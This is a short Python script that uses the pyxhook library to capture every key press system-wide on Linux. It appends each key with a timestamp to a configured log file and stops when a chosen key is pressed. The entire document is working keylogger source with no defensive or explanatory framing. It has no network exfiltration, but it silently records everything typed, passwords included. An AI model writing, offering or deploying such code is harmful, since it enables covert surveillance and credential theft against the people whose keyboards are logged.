import pyxhook
import datetime
import os

from decouple import config

log_file = config('LOG_LOCATION')
ascii_key_code = config('GRAVE_KEY_ASCII')
# this function is called everytime a key is pressed.

if not os.path.exists(log_file):
    os.mknod(log_file)


def OnKeyPress(event):
    x = datetime.datetime.now()
    data = str(x.strftime("%c")) + " : " + event.Key
    fob = open(log_file, 'a')
    fob.write(data)
    fob.write('\n')
    if event.Ascii == int(ascii_key_code):
        fob.close()
        new_hook.cancel()


# instantiate HookManager class
new_hook = pyxhook.HookManager()
# listen to all keystrokes
new_hook.KeyDown = OnKeyPress
# hook the keyboard
new_hook.HookKeyboard()
# start the session
new_hook.start()
